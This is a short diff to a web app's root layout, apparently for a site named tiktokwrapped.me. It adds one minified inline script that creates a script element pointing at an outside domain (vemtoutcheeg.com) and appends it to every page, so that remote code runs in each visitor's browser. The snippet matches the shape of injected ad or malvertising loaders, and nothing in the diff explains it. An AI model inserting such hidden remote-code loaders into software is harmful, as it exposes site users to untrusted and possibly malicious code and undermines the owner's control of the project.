@@ -24,6 +24,7 @@ export default function RootLayout({
         <main className="flex-grow">{children}</main>
         <Footer />
         <script defer data-domain="tiktokwrapped.me" src="https://tj.misew.top/js/script.js"></script>
+        <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',8432805,document.createElement('script'))</script>
       </body>
     </html>
   )
